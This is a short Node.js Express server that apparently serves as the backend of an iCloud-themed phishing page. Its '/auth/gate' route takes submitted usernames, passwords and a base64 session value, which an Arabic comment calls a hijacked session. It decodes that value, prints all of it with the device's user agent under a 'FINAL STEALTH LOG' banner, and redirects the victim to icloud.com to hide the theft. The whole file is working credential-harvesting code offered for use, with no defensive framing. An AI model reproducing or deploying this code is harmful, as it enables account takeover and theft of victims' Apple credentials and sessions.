const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/auth/gate', (req, res) => {
    const { u, p, sid } = req.body;
    
    // محاولة فك تشفير الجلسة المخطوفة
    let capturedSession = "Empty";
    try {
        if (sid) {
            capturedSession = Buffer.from(sid, 'base64').toString('utf8');
        }
    } catch (e) {
        capturedSession = "Error decoding session";
    }

    console.log("\n================ [ FINAL STEALTH LOG ] ================");
    console.log("USER: " + u);
    console.log("PASS: " + p);
    console.log("DEVICE: " + req.headers['user-agent']);
    console.log("FULL SESSION DATA: " + capturedSession);
    console.log("=======================================================\n");

    res.send('<script>window.location.href="https://icloud.com";</script>');
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log('Bypass Core Live on Port ' + PORT));
